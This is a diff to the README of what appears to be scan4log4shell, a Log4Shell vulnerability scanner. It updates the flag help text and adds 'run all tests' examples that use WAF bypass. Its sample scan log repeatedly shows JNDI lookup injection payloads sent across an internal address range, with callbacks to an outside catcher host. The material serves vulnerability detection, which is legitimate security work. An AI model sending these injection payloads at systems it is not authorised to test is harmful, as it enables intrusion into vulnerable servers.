@@ -182,6 +182,7 @@ Examples:
 - Scan a complete cidr: scan4log4shell remote cidr 172.20.0.0/24
 - TCP catcher: scan4log4shell remote cidr 172.20.0.0/24 --catcher-type tcp --caddr 172.20.0.30:4444
 - Custom headers file: scan4log4shell remote cidr 172.20.0.0/24 --headers-file ./headers.txt
+- Run all tests: scan4log4shell rremote cidr 172.20.0.0/24 -t get,post,json --waf-bypass
 
 Flags:
       --auth-fuzzing            add auth fuzzing
@@ -189,24 +190,24 @@ Flags:
       --caddr string            address to catch the callbacks (eg. ip:port)
       --catcher-type string     type of callback catcher (dns | ldap | tcp | none) (default "dns")
       --check-cve-2021-45046    check for CVE-2021-45046
-      --field stringArray       field to use
+      --field strings           field to use
       --fields-file string      use custom field from file
-      --header stringArray      header to use
+      --header strings          header to use
       --headers-file string     use custom headers from file
   -h, --help                    help for cidr
       --max-threads int         max number of concurrent threads (default 150)
       --no-redirect             do not follow redirects
       --no-user-agent-fuzzing   exclude user-agent header from fuzzing
       --no-wait-timeout         wait forever for callbacks
-      --payload stringArray     payload to use
+      --payload strings         payload to use
       --payloads-file string    use custom payloads from file
-  -p, --port stringArray        port to scan (default [8080])
+  -p, --port strings            port to scan (default [8080])
       --proxy string            proxy url
   -r, --resource string         resource in payload (default "l4s")
       --schema string           schema to use for requests (default "https")
       --submit-forms            add form submits to fuzzing
       --timeout duration        time limit for requests (default 3s)
-  -t, --type string             get, post or json (default "get")
+  -t, --type strings            get, post or json (default [get])
       --waf-bypass              extend scans with WAF bypass payload
   -w, --wait duration           wait time to catch callbacks (default 5s)
 
@@ -228,6 +229,7 @@ Examples:
 - TCP catcher: scan4log4shell remote url https://target.org --catcher-type tcp --caddr 172.20.0.30:4444
 - Custom headers file: scan4log4shell remote url https://target.org --headers-file ./headers.txt
 - Scan url behind basic auth: scan4log4shell remote url https://target.org --basic-auth user:pass
+- Run all tests: scan4log4shell remote url https://target.org -t get,post,json --waf-bypass
 
 Flags:
       --auth-fuzzing            add auth fuzzing
@@ -235,22 +237,22 @@ Flags:
       --caddr string            address to catch the callbacks (eg. ip:port)
       --catcher-type string     type of callback catcher (dns | ldap | tcp | none) (default "dns")
       --check-cve-2021-45046    check for CVE-2021-45046
-      --field stringArray       field to use
+      --field strings           field to use
       --fields-file string      use custom field from file
-      --header stringArray      header to use
+      --header strings          header to use
       --headers-file string     use custom headers from file
   -h, --help                    help for url
       --max-threads int         max number of concurrent threads (default 150)
       --no-redirect             do not follow redirects
       --no-user-agent-fuzzing   exclude user-agent header from fuzzing
       --no-wait-timeout         wait forever for callbacks
-      --payload stringArray     payload to use
+      --payload strings         payload to use
       --payloads-file string    use custom payloads from file
       --proxy string            proxy url
   -r, --resource string         resource in payload (default "l4s")
       --submit-forms            add form submits to fuzzing
       --timeout duration        time limit for requests (default 3s)
-  -t, --type string             get, post or json (default "get")
+  -t, --type strings            get, post or json (default [get])
       --waf-bypass              extend scans with WAF bypass payload
   -w, --wait duration           wait time to catch callbacks (default 5s)
 
@@ -267,23 +269,23 @@ scanner_1  | [i] Log4Shell Remote Vulnerability Scan
 scanner_1  | [i] Listening on c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh
 scanner_1  | [i] Start scanning CIDR 172.20.0.0/24
 scanner_1  | ---------
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.0:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.1:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.2:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.3:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.4:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.5:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.6:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.7:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.8:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.0:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.1:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.2:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.3:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.4:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.5:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.6:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.7:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.8:8080 [GET]
 scanner_1  | [!] Possibly vulnerable host identified: 172.20.0.3
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.9:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.10:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.11:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.12:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.13:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.14:8080
-scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.15:8080
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.9:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.10:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.11:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.12:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.13:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.14:8080 [GET]
+scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.15:8080 [GET]
 scanner_1  | [!] Possibly vulnerable host identified: 172.20.0.13
 ```
 
